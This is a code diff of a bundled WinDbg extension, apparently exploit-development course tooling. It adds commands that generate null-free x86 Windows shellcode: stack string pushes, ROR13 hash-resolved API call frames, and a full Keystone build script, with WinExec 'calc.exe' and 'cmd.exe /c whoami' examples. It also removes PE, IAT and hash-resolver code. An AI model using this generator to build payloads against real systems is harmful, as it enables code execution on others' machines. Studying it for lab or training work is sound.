+      "from keystone import Ks, KS_ARCH_X86, KS_MODE_32",
+      "",
+      `BADCHARS = bytes([${plan.badchars.map((byte) => `0x${byte.toString(16).padStart(2, "0")}`).join(", ")}])`,
+      "",
+      "ASM = [",
+      ...pythonAsmEntries(asm),
+      "]",
+      ...SCRIPT_TAIL.split("\n")
+    ];
+    return { ok: true, script, asm };
+  }
+
+  // src/commands/sc_writer.ts
+  var REGISTERS3 = ["eax", "ecx", "edx", "ebx", "ebp", "esi", "edi"];
+  var fail2 = (command2, args, error2) => ({ command: command2, args, success: false, findings: [], warnings: [], errors: [error2] });
+  var badList = (bytes) => bytes.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+  function splitBadToken(values) {
+    const rest = [];
+    let bad;
+    for (const value of values) {
+      const text = String(value);
+      if (/^bad(chars)?=/i.test(text.trim())) bad = text.trim().replace(/^bad(chars)?=/i, "");
+      else rest.push(text);
+    }
+    return { rest, bad };
+  }
+  function createScPushStringCommand() {
+    return {
+      name: "sc_push_string",
+      description: "Print x86 instructions that build a NUL-terminated string on the stack without 00 or the given bad characters, leaving ESP (and an optional register) pointing at it.",
+      usage: "dx @$osed().sc.push_string(text, badchars?, register?)",
+      examples: ['dx @$osed().sc.push_string("calc.exe")', 'dx @$osed().sc.push_string("cmd.exe /c whoami", "00 0A 0D 20", "ebx")'],
+      compactExampleCount: 2,
+      schema: { text: { type: "string", required: true }, badchars: { type: ["string", "array"] }, register: { type: "string" } },
+      execute(options) {
+        const text = options.text;
+        const badchars = parseBadchars(options.badchars);
+        if (!badchars) return fail2("sc_push_string", options, `Cannot read the bad characters "${String(options.badchars)}".`);
+        const register2 = options.register === void 0 || options.register === "" ? void 0 : String(options.register).trim().toLowerCase();
+        if (register2 !== void 0 && !REGISTERS3.includes(register2)) return fail2("sc_push_string", options, `Register must be one of ${REGISTERS3.join(", ")}.`);
+        const result3 = pushString(text, new Set(badchars), register2);
+        if (!result3.ok) return fail2("sc_push_string", options, result3.error);
+        const dwords = Math.floor(text.length / 4) + 1;
+        section(`sc.push_string: ${text.length} chars + NUL in ${dwords} dwords, pushed last dword first`);
+        info(`Avoids ${badList(badchars)}. Scratch register eax, ecx or edx may be clobbered.`);
+        for (const line of renderAsm(result3.lines)) print(line);
+        print("");
+        for (const line of renderKeystoneCode(result3.lines)) print(line);
+        return { command: "sc_push_string", args: { text, badchars, register: register2 }, success: true, findings: [{ text, dwords, lines: result3.lines }], warnings: [], errors: [] };
+      }
+    };
+  }
+  function createScCallFrameCommand() {
+    return {
+      name: "sc_call_frame",
+      description: "Print the push sequence for one stdcall API call through the sc.template resolver: arguments in reverse order, the ROR13 hash, the module base, and the two calls.",
+      usage: 'dx @$osed().sc.call_frame(api, args..., "bad=<list>"?)',
+      examples: ['dx @$osed().sc.call_frame("WinExec", "<ptr to cmd>", "1")', 'dx @$osed().sc.call_frame("TerminateProcess", "-1", "0", "bad=00 0A 0D")'],
+      compactExampleCount: 2,
+      schema: { api: { type: "string", required: true }, args: { type: "array" }, badchars: { type: ["string", "array"] } },
+      execute(options) {
+        var _a;
+        const badchars = parseBadchars(options.badchars);
+        if (!badchars) return fail2("sc_call_frame", options, `Cannot read the bad characters "${String(options.badchars)}".`);
+        const args = ((_a = options.args) != null ? _a : []).map(String);
+        const result3 = callFrame(options.api, args, new Set(badchars));
+        if (!result3.ok) return fail2("sc_call_frame", options, result3.error);
+        section(`sc.call_frame: ${result3.title}`);
+        info(`Avoids ${badList(badchars)}. Expects the sc.template frame: [ebp-0x04] resolver, [ebp-0x08] kernel32, [ebp-0x0c] last LoadLibraryA base.`);
+        for (const warning of result3.warnings) warn(warning);
+        for (const line of renderAsm(result3.lines)) print(line);
+        print("");
+        for (const line of renderKeystoneCode(result3.lines)) print(line);
+        return {
+          command: "sc_call_frame",
+          args: { api: result3.api, args, badchars },
+          success: true,
+          findings: [{ api: result3.api, module: result3.module, hash: `0x${result3.hash.toString(16).padStart(8, "0")}`, known: result3.known, lines: result3.lines }],
+          warnings: result3.warnings,
+          errors: []
+        };
+      }
+    };
+  }
+  function createScTemplateCommand() {
+    return {
+      name: "sc_template",
+      description: "Print a complete build_sc.py (Python 3 + Keystone) for null-free x86 shellcode: prologue, kernel32 lookup through the PEB, a ROR13 export resolver, one call frame per task, and the epilogue. The script reports every bad byte with its offset and line.",
+      usage: 'dx @$osed().sc.template(task..., "bad=<list>"?)',
+      examples: [
+        'dx @$osed().sc.template("winexec=calc.exe", "exit")',
+        'dx @$osed().sc.template("show=0", "winexec=cmd.exe /c whoami > C:\\\\out.txt", "terminate", "bad=00 0A 0D 20")',
+        'dx @$osed().sc.template("loadlibrary=user32.dll", "getprocaddress=MessageBoxA")'
+      ],
+      compactExampleCount: 2,
+      schema: { tasks: { type: "array" } },
+      execute(options) {
+        var _a;
+        const tokens = ((_a = options.tasks) != null ? _a : []).map(String);
+        const plan = parseTemplateArgs(tokens);
+        if (!plan.ok) return fail2("sc_template", options, plan.error);
+        const invocation = `sc.template(${tokens.map((token) => JSON.stringify(token)).join(", ")})`;
+        const result3 = buildTemplate(plan, invocation);
+        if (!result3.ok) return fail2("sc_template", options, result3.error);
+        section(`sc.template: build_sc.py, ${plan.tasks.length} task(s), bad chars ${badList(plan.badchars)}`);
+        info("Save everything below this line as build_sc.py and run: python build_sc.py");
+        for (const line of result3.script) print(line);
+        return { command: "sc_template", args: { tasks: plan.tasks, badchars: plan.badchars }, success: true, findings: [{ tasks: plan.tasks, script: result3.script.join("\n") }], warnings: [], errors: [] };
       }
     };
   }
@@ -13915,7 +16081,7 @@ var osed_bundle = (() => {
     }
     return findings;
   }
-  function readAsciiString(address, max) {
+  function readAsciiString2(address, max) {
     const bytes = [];
     for (let offset = 0; offset < max; offset += 1) {
       const next = tryReadMemory(address + BigInt(offset), 1);
@@ -13970,7 +16136,7 @@ var osed_bundle = (() => {
           return { command: "fmt_inspect", args: options, success: false, findings: [], warnings: [], errors: [`Could not read ${family} format argument at ESP+0x${formatArgOffset.toString(16)}.`] };
         }
         const formatAddress2 = BigInt(pointerBytes[0] | pointerBytes[1] << 8 | pointerBytes[2] << 16 | pointerBytes[3] << 24) & BigInt(4294967295);
-        const string = readAsciiString(formatAddress2, options.max);
+        const string = readAsciiString2(formatAddress2, options.max);
         if (!string) {
           return { command: "fmt_inspect", args: options, success: false, findings: [], warnings: [], errors: [`Could not read format string at ${formatAddress(formatAddress2, pointerSize)}.`] };
         }
@@ -14099,1525 +16265,6 @@ var osed_bundle = (() => {
   }
   function createFmtCommands() {
     return [createFmtBuildCommand(), createFmtOffsetCommand(), createFmtInspectCommand()];
-  }
-
-  // src/core/dx_result.ts
-  var DxRow = class {
-    constructor(values) {
-      for (const [key2, value] of Object.entries(values)) {
-        this[key2] = value;
-      }
-    }
-    toString() {
-      const pairs = Object.entries(this).filter(([, value]) => typeof value === "string");
-      return pairs.map(([key2, value]) => `${key2}: ${stripDml(value)}`).join(" | ");
-    }
-  };
-  var DxRows = class {
-    constructor(title, values) {
-      Object.defineProperty(this, "title", {
-        value: title,
-        enumerable: false,
-        configurable: false,
-        writable: false
-      });
-      Object.defineProperty(this, "values", {
-        value: values,
-        enumerable: false,
-        configurable: false,
-        writable: false
-      });
-      this.length = values.length;
-      values.forEach((row, index) => {
-        Object.defineProperty(this, index, {
-          value: row,
-          enumerable: false,
-          configurable: false,
-          writable: false
-        });
-      });
-    }
-    [Symbol.iterator]() {
-      return this.values[Symbol.iterator]();
-    }
-    map(callback) {
-      return this.values.map(callback);
-    }
-    forEach(callback) {
-      this.values.forEach(callback);
-    }
-    slice(start, end) {
-      return this.values.slice(start, end);
-    }
-    toArray() {
-      return [...this.values];
-    }
-    toString() {
-      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}; expand rows[N] for details`;
-    }
-  };
-  var DxResult = class {
-    constructor(title, rows) {
-      this.title = title;
-      this.rows = new DxRows(title, rows.map((row) => new DxRow(row)));
-      this.length = this.rows.length;
-    }
-    toString() {
-      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}`;
-    }
-  };
-  function toDxResult(title, rows) {
-    return new DxResult(title, rows);
-  }
-
-  // src/shellcode/index.ts
-  var MetasploitRor13Provider = class {
-    constructor() {
-      this.algorithm = "metasploit_ror13";
-      this.aliases = ["ror13", "msf_ror13"];
-      this.description = "Classic Metasploit-style API hash: ROR 13 then add byte.";
-    }
-    ror32(value, bits) {
-      const shift = bits & 31;
-      return (value >>> shift | value << 32 - shift) >>> 0;
-    }
-    hash(text) {
-      let hash = 0;
-      for (const byte of asciiBytes(text)) {
-        hash = this.ror32(hash, 13);
-        hash = hash + byte >>> 0;
-      }
-      return hash >>> 0;
-    }
-  };
-  var HashResolver = class {
-    constructor(providers) {
-      this.defaultAlias = "ror13";
-      var _a;
-      const configured = providers != null ? providers : [
-        new MetasploitRor13Provider(),
-        new Crc32Provider(),
-        new Rol7AddProvider()
-      ];
-      this.canonicalProviders = configured;
-      this.providers = /* @__PURE__ */ new Map();
-      for (const provider of configured) {
-        this.providers.set(provider.algorithm.toLowerCase(), provider);
-        for (const alias of (_a = provider.aliases) != null ? _a : []) {
-          this.providers.set(alias.toLowerCase(), provider);
-        }
-      }
-    }
-    compute(exportsList, algorithm) {
-      const provider = this.resolveProvider(algorithm);
-      if (!provider) {
-        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
-      }
-      const label = this.displayName(provider);
-      return exportsList.filter((entry) => entry.name.length > 0).map((entry) => ({
-        Algorithm: label,
-        Hash: `0x${provider.hash(entry.name).toString(16).toUpperCase().padStart(8, "0")}`,
-        Name: entry.name,
-        Address: toDmlAddress(entry.va, "u")
-      })).sort((a, b) => a.Name.localeCompare(b.Name));
-    }
-    hashValue(text, algorithm) {
-      const provider = this.resolveProvider(algorithm);
-      if (!provider) {
-        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
-      }
-      return {
-        Input: text,
-        Algorithm: this.displayName(provider),
-        Hash: `0x${provider.hash(text).toString(16).toUpperCase().padStart(8, "0")}`
-      };
-    }
-    listAlgorithms() {
-      const defaultProvider = this.resolveProvider(this.defaultAlias);
-      return this.canonicalProviders.map((provider) => {
-        var _a;
-        return {
-          Algorithm: provider.algorithm,
-          Aliases: ((_a = provider.aliases) != null ? _a : []).join(", "),
-          Description: provider.description,
-          Default: provider === defaultProvider ? "yes" : "no"
-        };
-      }).sort((a, b) => a.Algorithm.localeCompare(b.Algorithm));
-    }
-    supportedAlgorithms() {
-      return Array.from(this.providers.keys()).sort();
-    }
-    resolveProvider(algorithm) {
-      const selected = (algorithm != null ? algorithm : this.defaultAlias).trim().toLowerCase();
-      return this.providers.get(selected);
-    }
-    displayName(provider) {
-      return provider.aliases && provider.aliases.length > 0 ? provider.aliases[0].toUpperCase() : provider.algorithm;
-    }
-  };
-  var Crc32Provider = class {
-    constructor() {
-      this.algorithm = "crc32";
-      this.description = "CRC32 (IEEE polynomial 0xEDB88320) over ASCII bytes.";
-      this.table = this.buildTable();
-    }
-    hash(text) {
-      let crc = 4294967295;
-      for (const byte of asciiBytes(text)) {
-        const index = (crc ^ byte) & 255;
-        crc = crc >>> 8 ^ this.table[index];
-      }
-      return (crc ^ 4294967295) >>> 0;
-    }
-    buildTable() {
-      const table2 = [];
-      for (let i = 0; i < 256; i += 1) {
-        let value = i;
-        for (let bit = 0; bit < 8; bit += 1) {
-          if ((value & 1) === 1) {
-            value = value >>> 1 ^ 3988292384;
-          } else {
-            value >>>= 1;
-          }
-        }
-        table2.push(value >>> 0);
-      }
-      return table2;
-    }
-  };
-  var Rol7AddProvider = class {
-    constructor() {
-      this.algorithm = "rol7_add";
-      this.aliases = ["rol7"];
-      this.description = "Rotate-left by 7 then add byte (32-bit accumulator).";
-    }
-    rol32(value, bits) {
-      const shift = bits & 31;
-      return (value << shift | value >>> 32 - shift) >>> 0;
-    }
-    hash(text) {
-      let hash = 0;
-      for (const byte of asciiBytes(text)) {
-        hash = this.rol32(hash, 7);
-        hash = hash + byte >>> 0;
-      }
-      return hash >>> 0;
-    }
-  };
-  function asciiBytes(text) {
-    const bytes = [];
-    for (let i = 0; i < text.length; i += 1) {
-      const code = text.charCodeAt(i);
-      if (code > 127) {
-        throw new Error("Hash input must be ASCII for shellforge parity.");
-      }
-      bytes.push(code & 255);
-    }
-    return bytes;
-  }
-  var PEParser = class {
-    constructor(pointerSize) {
-      this.pointerSize = pointerSize;
-    }
-    parseHeaders(module) {
-      const base = module.base;
-      const mz = readUint16LE(base);
-      if (mz !== 23117) {
-        throw new Error(`Invalid DOS header for ${module.name}.`);
-      }
-      const eLfanew = readUint32LE(base + BigInt(60));
-      const ntHeader = base + BigInt(eLfanew);
-      const signature = readUint32LE(ntHeader);
-      if (signature !== 17744) {
-        throw new Error(`Invalid NT header signature for ${module.name}.`);
-      }
-      const machine = readUint16LE(ntHeader + BigInt(4));
-      let timeDateStamp = 0;
-      try {
-        timeDateStamp = readUint32LE(ntHeader + BigInt(8));
-      } catch (_error) {
-      }
-      const optionalHeader = ntHeader + BigInt(24);
-      const optionalHeaderMagic = readUint16LE(optionalHeader);
-      const isPe32Plus = optionalHeaderMagic === 523;
-      if (!isPe32Plus && optionalHeaderMagic !== 267) {
-        throw new Error(`Unsupported optional header magic 0x${optionalHeaderMagic.toString(16)}.`);
-      }
-      const entryPointRva = readUint32LE(optionalHeader + BigInt(16));
-      const imageBase = isPe32Plus ? readPointer(optionalHeader + BigInt(24), 8) : BigInt(readUint32LE(optionalHeader + BigInt(28)));
-      const sizeOfImage = readUint32LE(optionalHeader + BigInt(56));
-      const dataDirectoryOffset = optionalHeader + BigInt(isPe32Plus ? 112 : 96);
-      const exportDirectoryRva = readUint32LE(dataDirectoryOffset);
-      const exportDirectorySize = readUint32LE(dataDirectoryOffset + BigInt(4));
-      return {
-        dosHeader: base,
-        eLfanew,
-        ntHeader,
-        machine,
-        machineName: machineToString(machine),
-        timeDateStamp,
-        entryPointRva,
-        entryPointVa: base + BigInt(entryPointRva),
-        imageBase,
-        sizeOfImage,
-        optionalHeaderMagic,
-        exportDirectoryRva,
-        exportDirectoryVa: base + BigInt(exportDirectoryRva),
-        exportDirectorySize
-      };
-    }
-    parseExports(module) {
-      var _a;
-      const exportInfo = this.parseExportDirectory(module);
-      if (!exportInfo) {
-        return [];
-      }
-      if (exportInfo.numberOfFunctions === 0 || exportInfo.addressOfFunctionsRva === 0) {
-        return [];
-      }
-      const functionsVa = module.base + BigInt(exportInfo.addressOfFunctionsRva);
-      const namesVa = module.base + BigInt(exportInfo.addressOfNamesRva);
-      const ordinalsVa = module.base + BigInt(exportInfo.addressOfNameOrdinalsRva);
-      const namesByIndex = /* @__PURE__ */ new Map();
-      for (let i = 0; i < exportInfo.numberOfNames; i += 1) {
-        const nameRva = readUint32LE(namesVa + BigInt(i * 4));
-        const ordinalIndex = readUint16LE(ordinalsVa + BigInt(i * 2));
-        const nameAddress = module.base + BigInt(nameRva);
-        namesByIndex.set(ordinalIndex, readAsciiString2(nameAddress, 512));
-      }
-      const entries = [];
-      for (let index = 0; index < exportInfo.numberOfFunctions; index += 1) {
-        const rva = readUint32LE(functionsVa + BigInt(index * 4));
-        const va = module.base + BigInt(rva);
-        const ordinal = exportInfo.ordinalBase + index;
-        entries.push({
-          ordinal,
-          rva,
-          va,
-          name: (_a = namesByIndex.get(index)) != null ? _a : ""
-        });
-      }
-      return entries;
-    }
-    formatHeaderRows(module) {
-      const headers = this.parseHeaders(module);
-      return [
-        { Field: "Base", Value: toDmlAddress(module.base, "db") },
-        { Field: "DOS Header", Value: toDmlAddress(headers.dosHeader, "db") },
-        { Field: "e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
-        { Field: "NT Header", Value: toDmlAddress(headers.ntHeader, "db") },
-        { Field: "Machine", Value: `${headers.machineName} (0x${headers.machine.toString(16).toUpperCase()})` },
-        { Field: "EntryPoint", Value: `${toDmlAddress(headers.entryPointVa, "u")} (RVA 0x${headers.entryPointRva.toString(16).toUpperCase()})` },
-        { Field: "ImageBase", Value: formatAddress(headers.imageBase, this.pointerSize) },
-        { Field: "SizeOfImage", Value: `0x${headers.sizeOfImage.toString(16).toUpperCase()}` },
-        { Field: "ExportDir RVA", Value: `0x${headers.exportDirectoryRva.toString(16).toUpperCase()}` },
-        { Field: "ExportDir VA", Value: toDmlAddress(headers.exportDirectoryVa, "db") }
-      ];
-    }
-    parseExportDirectory(module) {
-      const headers = this.parseHeaders(module);
-      if (headers.exportDirectoryRva === 0 || headers.exportDirectorySize === 0) {
-        return void 0;
-      }
-      const exportDir = module.base + BigInt(headers.exportDirectoryRva);
-      return {
-        exportDirectoryRva: headers.exportDirectoryRva,
-        exportDirectoryVa: headers.exportDirectoryVa,
-        exportDirectorySize: headers.exportDirectorySize,
-        ordinalBase: readUint32LE(exportDir + BigInt(16)),
-        numberOfFunctions: readUint32LE(exportDir + BigInt(20)),
-        numberOfNames: readUint32LE(exportDir + BigInt(24)),
-        addressOfFunctionsRva: readUint32LE(exportDir + BigInt(28)),
-        addressOfNamesRva: readUint32LE(exportDir + BigInt(32)),
-        addressOfNameOrdinalsRva: readUint32LE(exportDir + BigInt(36))
-      };
-    }
-  };
-  var ExportResolver = class {
-    constructor(parser) {
-      // parseExports reads the module's whole export table (many string reads). It is
-      // called per import entry by nearestSymbol during iat_find, so without a cache
-      // an all-modules scan re-reads kernel32/kernelbase exports tens of thousands of
-      // times — minutes to hours. Cache per module base (a rebase changes the key).
-      this.exportCache = /* @__PURE__ */ new Map();
-      this.parser = parser;
-    }
-    cachedExports(module) {
-      const key2 = module.base.toString();
-      let cached = this.exportCache.get(key2);
-      if (!cached) {
-        cached = this.parser.parseExports(module);
-        this.exportCache.set(key2, cached);
-      }
-      return cached;
-    }
-    enumerate(module, filter) {
-      const entries = this.cachedExports(module);
-      const needle = normalizeNeedle(filter);
-      return entries.filter((entry) => {
-        if (!needle) {
-          return true;
-        }
-        return entry.name.toLowerCase().includes(needle);
-      }).sort((a, b) => {
-        const left = a.name || `~${a.ordinal.toString(16)}`;
-        const right = b.name || `~${b.ordinal.toString(16)}`;
-        return left.localeCompare(right);
-      }).map((entry) => ({
-        Ordinal: entry.ordinal.toString(),
-        RVA: `0x${entry.rva.toString(16).toUpperCase().padStart(8, "0")}`,
-        VA: toDmlAddress(entry.va, "u"),
-        Name: entry.name || "<unnamed>"
-      }));
-    }
-    resolve(module, symbol) {
-      const needle = symbol.trim().toLowerCase();
-      if (!needle) {
-        return void 0;
-      }
-      return this.cachedExports(module).find((entry) => entry.name.toLowerCase() === needle);
-    }
-    getExports(module) {
-      return this.cachedExports(module);
-    }
-    getExportDirectory(module) {
-      return this.parser.parseExportDirectory(module);
-    }
-    findByOrdinalIndex(module, ordinalIndex) {
-      if (ordinalIndex < 0) {
-        return void 0;
-      }
-      const exportDir = this.parser.parseExportDirectory(module);
-      if (!exportDir) {
-        return void 0;
-      }
-      const targetOrdinal = exportDir.ordinalBase + ordinalIndex;
-      return this.cachedExports(module).find((entry) => entry.ordinal === targetOrdinal);
-    }
-    isForwarded(module, entry) {
-      const exportDir = this.parser.parseExportDirectory(module);
-      if (!exportDir) {
-        return { forwarded: false, target: "" };
-      }
-      const start = exportDir.exportDirectoryRva;
-      const end = start + exportDir.exportDirectorySize;
-      if (entry.rva >= start && entry.rva < end) {
-        return {
-          forwarded: true,
-          target: readAsciiString2(module.base + BigInt(entry.rva), 512)
-        };
-      }
-      return { forwarded: false, target: "" };
-    }
-    nearestSymbol(module, address) {
-      const exportsList = this.cachedExports(module).filter((entry) => entry.name.length > 0).sort((a, b) => a.va < b.va ? -1 : 1);
-      let nearest;
-      for (const entry of exportsList) {
-        if (entry.va > address) {
-          break;
-        }
-        nearest = entry;
-      }
-      if (!nearest) {
-        return void 0;
-      }
-      return { name: nearest.name, offset: address - nearest.va };
-    }
-  };
-  var IATResolver = class {
-    constructor(pointerSize, parser, exportResolver, modulesProvider) {
-      this.pointerSize = pointerSize;
-      this.parser = parser;
-      this.exportResolver = exportResolver;
-      this.modulesProvider = modulesProvider;
-    }
-    enumerateIat(owner) {
-      const headers = this.parser.parseHeaders(owner);
-      const importDirRva = this.readImportDirectoryRva(owner, headers.optionalHeaderMagic, headers.ntHeader);
-      if (importDirRva === 0) {
-        return [];
-      }
-      const modules = this.modulesProvider();
-      const rows = [];
-      const descriptors = this.readImportDescriptors(owner, importDirRva);
-      const firstThunkBounds = descriptors.map((descriptor) => descriptor.firstThunk).filter((rva) => rva > 0).sort((left, right) => left - right);
-      for (const descriptor of descriptors) {
-        const { originalFirstThunk, nameRva, firstThunk } = descriptor;
-        const nextFirstThunk = firstThunkBounds.find((rva) => rva > firstThunk);
-        const iatEnd = nextFirstThunk ? owner.base + BigInt(nextFirstThunk) : void 0;
-        if (firstThunk === 0) {
-          continue;
-        }
-        const dllName = nameRva === 0 ? "<unknown>" : readAsciiString2(owner.base + BigInt(nameRva), 260);
-        const expectedModule = this.findByDllName(modules, dllName);
-        const intBaseRva = originalFirstThunk !== 0 ? originalFirstThunk : firstThunk;
-        let intPtr = owner.base + BigInt(intBaseRva);
-        let iatPtr = owner.base + BigInt(firstThunk);
-        const maxThunks = 16384;
-        for (let thunkIndex = 0; thunkIndex < maxThunks; thunkIndex += 1) {
-          if (iatEnd !== void 0 && iatPtr >= iatEnd) {
-            break;
-          }
-          const intValue = this.readThunk(intPtr);
-          const iatValue = this.readThunk(iatPtr);
-          if (intValue === BigInt(0) && iatValue === BigInt(0)) {
-            break;
-          }
-          const target = iatValue;
-          const actualModule = this.findContainingModule(modules, target);
-          const nearest = actualModule ? this.exportResolver.nearestSymbol(actualModule, target) : void 0;
-          const imported = this.parseImportedName(owner, intValue);
-          rows.push({
-            ownerModule: owner.name,
-            importDll: dllName,
-            symbol: this.displayImportedSymbol(imported, nearest, expectedModule, actualModule),
-            ordinal: imported.ordinal,
-            nameWarning: imported.warning,
-            slot: iatPtr,
-            target,
-            expectedModule,
-            actualModule,
-            nearest,
-            status: this.classifyStatus(target, expectedModule, actualModule)
-          });
-          intPtr += BigInt(this.pointerSize);
-          iatPtr += BigInt(this.pointerSize);
-        }
-      }
-      return rows;
-    }
-    readImportDescriptors(owner, importDirRva) {
-      const descriptors = [];
-      let descriptorAddress = owner.base + BigInt(importDirRva);
-      const maxDescriptors = 4096;
-      for (let index = 0; index < maxDescriptors; index += 1) {
-        const originalFirstThunk = readUint32LE(descriptorAddress);
-        const _timeDateStamp = readUint32LE(descriptorAddress + BigInt(4));
-        const _forwarderChain = readUint32LE(descriptorAddress + BigInt(8));
-        const nameRva = readUint32LE(descriptorAddress + BigInt(12));
-        const firstThunk = readUint32LE(descriptorAddress + BigInt(16));
-        if (originalFirstThunk === 0 && nameRva === 0 && firstThunk === 0) {
-          break;
-        }
-        descriptors.push({ originalFirstThunk, nameRva, firstThunk, descriptorAddress });
-        descriptorAddress += BigInt(20);
-      }
-      return descriptors;
-    }
-    classifyStatus(target, expected, actual) {
-      if (target === BigInt(0)) {
-        return "unresolved";
-      }
-      if (!this.isMapped(target)) {
-        return "unmapped";
-      }
-      if (!actual) {
-        return "unknown-module";
-      }
-      if (!this.isExecutable(actual, target)) {
-        return "non-exec";
-      }
-      if (expected && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
-        return "outside-module";
-      }
-      return "ok";
-    }
-    isMapped(address) {
-      if (address === BigInt(0)) {
-        return false;
-      }
-      try {
-        readMemory(address, 1);
-        return true;
-      } catch (_error) {
-        return false;
-      }
-    }
-    isExecutable(module, address) {
-      try {
-        const headers = this.parser.parseHeaders(module);
-        const numberOfSections = readUint16LE(headers.ntHeader + BigInt(6));
-        const sizeOfOptionalHeader = readUint16LE(headers.ntHeader + BigInt(20));
-        let sectionHeader = headers.ntHeader + BigInt(24 + sizeOfOptionalHeader);
-        const rva = address - module.base;
-        const IMAGE_SCN_MEM_EXECUTE2 = 536870912;
-        for (let i = 0; i < numberOfSections; i += 1) {
-          const virtualSize = readUint32LE(sectionHeader + BigInt(8));
-          const virtualAddress = readUint32LE(sectionHeader + BigInt(12));
-          const characteristics = readUint32LE(sectionHeader + BigInt(36));
-          const start = BigInt(virtualAddress);
-          const end = start + BigInt(Math.max(virtualSize, 1));
-          if (rva >= start && rva < end) {
-            return (characteristics & IMAGE_SCN_MEM_EXECUTE2) !== 0;
-          }
-          sectionHeader += BigInt(40);
-        }
-      } catch (_error) {
-        return false;
-      }
-      return false;
-    }
-    readImportDirectoryRva(owner, optionalMagic, ntHeader) {
-      const optionalHeader = ntHeader + BigInt(24);
-      const dataDirectoryOffset = optionalHeader + BigInt(optionalMagic === 523 ? 112 : 96);
-      try {
-        return readUint32LE(dataDirectoryOffset + BigInt(8));
-      } catch (_error) {
-        return 0;
-      }
-    }
-    findContainingModule(modules, address) {
-      return modules.find((module) => address >= module.base && address < module.end);
-    }
-    findByDllName(modules, name) {
-      const needle = name.trim().toLowerCase();
-      if (!needle) {
-        return void 0;
-      }
-      const noExt = needle.endsWith(".dll") ? needle.slice(0, -4) : needle;
-      return modules.find((module) => {
-        const lower = module.name.toLowerCase();
-        const lowerNoExt = lower.endsWith(".dll") ? lower.slice(0, -4) : lower;
-        return lower === needle || lowerNoExt === noExt;
-      });
-    }
-    displayImportedSymbol(imported, nearest, expected, actual) {
-      if (!imported.name.startsWith("<")) {
-        return imported.name;
-      }
-      if (expected && actual && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
-        return imported.name;
-      }
-      if (nearest && nearest.offset === BigInt(0)) {
-        return nearest.name;
-      }
-      if (nearest) {
-        return `${nearest.name}+0x${nearest.offset.toString(16).toUpperCase()}`;
-      }
-      return imported.name;
-    }
-    parseImportedName(owner, intValue) {
-      if (intValue === BigInt(0)) {
-        return { name: "<null>" };
-      }
-      const ordinalFlag = this.pointerSize === 8 ? BigInt("0x8000000000000000") : BigInt("0x80000000");
-      if ((intValue & ordinalFlag) !== BigInt(0)) {
-        return { name: "<ordinal>", ordinal: Number(intValue & BigInt(65535)) };
-      }
-      if (intValue < BigInt(256) || intValue >= owner.size) {
-        return {
-          name: "<invalid-name-rva>",
-          warning: `Thunk value 0x${intValue.toString(16).toUpperCase()} is not an import-name RVA.`
-        };
-      }
-      const byName = owner.base + intValue + BigInt(2);
-      try {
-        return { name: readAsciiString2(byName, 512) };
-      } catch (error2) {
-        return {
-          name: "<unreadable-name>",
-          warning: formatError(error2)
-        };
-      }
-    }
-    readThunk(address) {
-      return this.pointerSize === 8 ? readPointer(address, 8) : BigInt(readUint32LE(address));
-    }
-  };
-  var ShellcodeHelper = class {
-    constructor() {
-      this.pointerSize = getPointerSize();
-      this.parser = new PEParser(this.pointerSize);
-      this.exportResolver = new ExportResolver(this.parser);
-      this.hashResolver = new HashResolver();
-      this.iatResolver = new IATResolver(this.pointerSize, this.parser, this.exportResolver, () => this.readModules());
-    }
-    peb() {
-      const pebAddress = this.getPebAddress();
-      if (!pebAddress) {
-        return this.errorRows("Unable to resolve PEB in current context.");
-      }
-      try {
-        const ldrOffset = this.pointerSize === 8 ? 24 : 12;
-        const processParametersOffset = this.pointerSize === 8 ? 32 : 16;
-        const imageBaseOffset = this.pointerSize === 8 ? 16 : 8;
-        const ldr = readPointer(pebAddress + BigInt(ldrOffset), this.pointerSize);
-        const processParameters = readPointer(pebAddress + BigInt(processParametersOffset), this.pointerSize);
-        const imageBase = readPointer(pebAddress + BigInt(imageBaseOffset), this.pointerSize);
-        const beingDebugged = readMemory(pebAddress + BigInt(2), 1)[0] !== 0;
-        return [
-          { Field: "PEB", Value: toDmlAddress(pebAddress, "db") },
-          { Field: "Ldr", Value: toDmlAddress(ldr, "db") },
-          { Field: "ProcessParameters", Value: toDmlAddress(processParameters, "db") },
-          { Field: "BeingDebugged", Value: beingDebugged ? "true" : "false" },
-          { Field: "ImageBase", Value: toDmlAddress(imageBase, "db") }
-        ];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    modules() {
-      return this.readModules().map((module) => ({
-        Base: toDmlAddress(module.base, "db"),
-        End: toDmlAddress(module.end, "db"),
-        Size: `0x${module.size.toString(16).toUpperCase()}`,
-        Name: module.name,
-        Path: module.path
-      }));
-    }
-    modulePages(moduleName) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const pageSize = BigInt(4096);
-      const pages = lookup.module.size === BigInt(0) ? BigInt(0) : (lookup.module.size + pageSize - BigInt(1)) / pageSize;
-      return [
-        {
-          Module: lookup.module.name,
-          Base: toDmlAddress(lookup.module.base, "db"),
-          End: toDmlAddress(lookup.module.end, "db"),
-          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
-          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
-          Pages: pages.toString()
-        }
-      ];
-    }
-    pageSummary(moduleName) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const summary = this.collectPageProtections(lookup.module);
-      const pageSize = BigInt(4096);
-      const totalPages = Array.from(summary.values()).reduce((sum, count) => sum + count, 0);
-      const executablePages = Array.from(summary.entries()).reduce((sum, [protect, count]) => {
-        return sum + (this.isExecutableProtect(protect) ? count : 0);
-      }, 0);
-      const rows = [
-        {
-          Module: lookup.module.name,
-          Base: toDmlAddress(lookup.module.base, "db"),
-          End: toDmlAddress(lookup.module.end, "db"),
-          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
-          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
-          TotalPages: totalPages.toString(),
